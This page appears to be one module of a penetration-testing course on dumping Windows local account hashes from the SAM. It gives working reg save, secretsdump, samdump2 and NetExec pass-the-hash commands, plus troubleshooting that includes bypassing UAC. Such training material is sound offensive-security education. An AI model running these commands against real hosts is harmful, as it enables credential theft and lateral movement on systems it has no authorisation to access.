---
title: Dump local hashes from the SAM
slug: attack-sam
area: windows
module: 10
order: 3
goal: Recover the local account NT hashes from a Windows host's SAM database.
summary: How to attack the SAM — grab the SAM, SYSTEM (and SECURITY) hives via reg save or a remote read, then extract local hashes and LSA secrets with secretsdump or samdump2.
prereqs: [Local admin on the target, The SAM and SYSTEM registry hives (saved locally, or read remotely), A place to parse them offline]
seeAlso: [tool:secretsdump, tool:netexec, tool:mimikatz, map:password-cracking, map:credential-access]
references:
  - HackTricks: SAM and SYSTEM | https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/index.html
  - Impacket | https://github.com/fortra/impacket
---

The SAM holds the local accounts' NT hashes, encrypted with a key in the SYSTEM hive — so you need **both** hives. The SECURITY hive adds LSA secrets and cached domain logons. Once you have them, hashes come out offline.

## Save the hives on the target

```cmd
reg save HKLM\SAM      C:\temp\sam.save
reg save HKLM\SYSTEM   C:\temp\system.save
reg save HKLM\SECURITY C:\temp\security.save
```

Copy them to your box (see File transfers), then extract.

## Extract the hashes offline

```bash
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
samdump2 system.save sam.save
```

## Or do it remotely in one shot (NetExec / secretsdump)

With admin creds or a hash, no manual hive copying:

```bash
nxc smb TARGET -u Administrator -H <nthash> --sam --lsa
secretsdump.py 'Administrator:@TARGET' -hashes :<nthash>
```

## If it fails

- **Access denied on reg save**: you're not admin, or not in an elevated (high-integrity) shell — bypass UAC / escalate first.
- **secretsdump "SAM hashes" empty**: you passed the wrong hive pair; SAM **and** SYSTEM are both required.
- **Remote --sam denied for a local admin that isn't RID 500**: `LocalAccountTokenFilterPolicy` again — use the built-in Administrator or a domain admin, or fall back to the manual `reg save` route.
- **Only machine account / no useful users**: local SAM may just be the built-in accounts; pivot to LSASS or the domain (NTDS) for user creds.

## Verify

Output is `user:rid:lmhash:nthash` — a real NT hash (not the empty `31d6...`) is the win:

```bash
secretsdump.py -sam sam.save -system system.save LOCAL | grep -vi '31d6cfe0'
```

Take the NT hash straight to Pass-the-Hash.
